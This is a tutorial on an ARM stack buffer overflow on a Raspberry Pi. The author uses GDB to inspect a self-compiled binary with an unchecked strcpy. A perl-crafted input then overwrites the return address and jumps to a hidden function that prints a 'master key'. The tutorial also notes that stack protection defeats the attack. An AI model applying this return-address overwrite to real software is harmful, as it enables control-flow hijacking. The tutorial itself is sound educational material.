# Buffer overflow on ARM architecture


## Prerequisites
-	A RaspberryPi and a distro. For this tutorial, I had an up-to-date Raspbian Stretch Lite with LXDE.
-	GCC and GDB.

## ARM registers and stack
TODO

## An example of buffer overflow
### Initial state
- We have a binary without its source code but compiled with debug information.
- We know how to use it: `./prog2 PASS` where `PASS` is a 4-character string.
- We would like to know if there's interesting stuff or even dead code in it.

### Playground
Run GDB:
```bash
gdb prog2
```
What we can disassemble with GDB:
```assembly
(gdb) disassemble
/usr/include/arm-linux-gnueabihf/bits/sys_errlist.h  __gmon_start__                                       frame_dummy
/usr/include/arm-linux-gnueabihf/bits/types.h        __gmon_start__@plt                                   int
/usr/include/libio.h                                 __init_array_end                                     long int
/usr/include/stdio.h                                 __init_array_start                                   long long int
/usr/lib/gcc/arm-linux-gnueabihf/6/include/stddef.h  __libc_csu_fini                                      long long unsigned int
_DYNAMIC                                             __libc_csu_init                                      long unsigned int
_GLOBAL_OFFSET_TABLE_                                __libc_start_main                                    main
_IO_2_1_stderr_                                      __libc_start_main@plt                                prog2.c
_IO_2_1_stdin_                                       __off64_t                                            puts
_IO_2_1_stdout_                                      __off_t                                              puts@plt
_IO_FILE                                             __quad_t                                             register_tm_clones
_IO_lock_t                                           _bss_end__                                           short int
_IO_marker                                           _edata                                               short unsigned int
_IO_stdin_used                                       _end                                                 signed char
__FRAME_END__                                        _fini                                                size_t
__JCR_END__                                          _init                                                sizetype
__JCR_LIST__                                         _start                                               stderr
__TMC_END__                                          abort                                                stdin
__bss_end__                                          abort@plt                                            stdout
__bss_start                                          call_weak_fn                                         strcpy
__bss_start__                                        char                                                 strcpy@plt
__data_start                                         completed                                            sys_errlist
__do_global_dtors_aux                                data_start                                           sys_nerr
__do_global_dtors_aux_fini_array_entry               deregister_tm_clones                                 unsigned char
__dso_handle                                         dont_touch_this                                      unsigned int
__end__                                              exit
__frame_dummy_init_array_entry                       exit@plt
```
Lots of stuff there... We can find at least two interesting:
- `main`
- `dont_touch_this`. Yes, I compiled the code myself for this tutorial. Of course, you should not name critical code like this!

Let's disassemble the main function
```assembly
(gdb) disassemble main
Dump of assembler code for function main:
   0x000104b8 <+0>:     push    {r11, lr}
   0x000104bc <+4>:     add     r11, sp, #4
   0x000104c0 <+8>:     sub     sp, sp, #16
   0x000104c4 <+12>:    str     r0, [r11, #-16]
   0x000104c8 <+16>:    str     r1, [r11, #-20] ; 0xffffffec
   0x000104cc <+20>:    ldr     r3, [r11, #-20] ; 0xffffffec
   0x000104d0 <+24>:    add     r3, r3, #4
   0x000104d4 <+28>:    ldr     r2, [r3]
   0x000104d8 <+32>:    sub     r3, r11, #8
   0x000104dc <+36>:    mov     r1, r2
   0x000104e0 <+40>:    mov     r0, r3
   0x000104e4 <+44>:    bl      0x1032c <strcpy@plt>
   0x000104e8 <+48>:    mov     r3, #0
   0x000104ec <+52>:    mov     r0, r3
   0x000104f0 <+56>:    sub     sp, r11, #4
   0x000104f4 <+60>:    pop     {r11, pc}
End of assembler dump.
```
- No call to `dont_touch_this`. It means this is a dead code section. Why?
- Oh, `strcpy`! We found a breach! This functions must not be used nowadays as it doesn't check buffer length (https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml). We should try a buffer overflow at this line.

If we disassemble `dont_touch_this`, we can get the entry point of this function (address `0x0001049c`):
```assembly
(gdb) disassemble dont_touch_this
Dump of assembler code for function dont_touch_this:
   0x0001049c <+0>:     push    {r11, lr}
   0x000104a0 <+4>:     add     r11, sp, #4
   0x000104a4 <+8>:     ldr     r0, [pc, #8]    ; 0x104b4 <dont_touch_this+24>
   0x000104a8 <+12>:    bl      0x10338 <puts@plt>
   0x000104ac <+16>:    mov     r0, #0
   0x000104b0 <+20>:    bl      0x1035c <exit@plt>
   0x000104b4 <+24>:    andeq   r0, r1, r8, ror #10
End of assembler dump.
```
Putting a breakpoint right after the `strcpy`: 
```assembly
(gdb) break *0x000104e8
Breakpoint 1 at 0x104e8: file prog2.c, line 14.
```
Running the program with valid input and checking registers and stack values:
```assembly
(gdb) run AAAA
Starting program: /home/pi/Documents/tutorial/prog2 AAAA
Breakpoint 1, main (argc=2, argv=0x7efff684) at prog2.c:14
14          return 0;
```

```assembly
(gdb) info registers
r0             0x7efff524       2130703652
r1             0x7efff7d7       2130704343
r2             0x0      0
r3             0x9      9
r4             0x104f8  66808
r5             0x0      0
r6             0x10374  66420
r7             0x0      0
r8             0x0      0
r9             0x0      0
r10            0x76fff000       1996484608
r11            0x7efff52c       2130703660
r12            0x7efff524       2130703652
sp             0x7efff518       0x7efff518
lr             0x104e8  66792
pc             0x104e8  0x104e8 <main+48>
cpsr           0x20000010       536870928
```
```assembly
(gdb) x/16x $sp
0x7efff518:     0x7efff684      0x00000002      0x00000000      0x41414141
0x7efff528:     0x00000000      0x76e80678      0x76fa5000      0x7efff684
0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
0x7efff548:     0xf35a2f10      0xfb4ddc14      0x000104f8      0x00000000
```
- In the stack, we can see our `AAAA` as `0x41414141` (ASCII codes, little-endian).
- `0x76e80678` is the return address.

Same thing with longer input:
```assembly
(gdb) run ABCDABCD
Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
```

```assembly
(gdb) x/16x $sp
0x7efff518:     0x7efff684      0x00000002      0x00000000      0x44434241
0x7efff528:     0x44434241      0x76e80600      0x76fa5000      0x7efff684
0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
0x7efff548:     0xc9cf5894      0xc1d8ab90      0x000104f8      0x00000000
```
- As expected, we find the `0x44434241` twice (corresponds to `DCBA`).  

```assembly
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x76e80600 in __libc_start_main (main=0x7efff684, argc=1996115968, argv=0x76e80600 <__libc_start_main+156>, init=0x104f8 <__libc_csu_init>,
    fini=0x10558 <__libc_csu_fini>, rtld_fini=0x76fdf9b8 <_dl_fini>, stack_end=0x7efff684) at libc-start.c:247
247     libc-start.c: No such file or directory.
```
If we continue the program execution, we see a segfault while the return address is `0x76e80600`..
There's already a buffer overflow here. However, it would be useful to redirect it to the `dont_touch_this` method to see what's in there.

```bash
pi@raspberrypi:~/Documents/tutorial $ ./prog2 $(perl -e 'print "ABCDABCD\x9c\x04\x01";')
The master key is 0xDEADBEEF
```
YES! We entered the dead code and found a master key :smiling_imp:
- `ABCDABCD` to fill the stack with some bytes (it could be anything).
- The next 3 bytes are the entry point of `dont_touch_this` in little endian (see GDB output).
- I was lucky because this binary was compiled without stack protection. It seems a bit crazy but, on a default Raspbian distro, the `fstack-protector` flag is not enabled...

If I tried my buffer overflow attack when the binary has been compiled with the stack protector, I would get the following message:
```bash
*** stack smashing detected ***: ./prog2 terminated
Aborted__
```

## References
https://www.merckedsecurity.com/blog/smashing-the-arm-stack-part-1

http://billyellis.net/

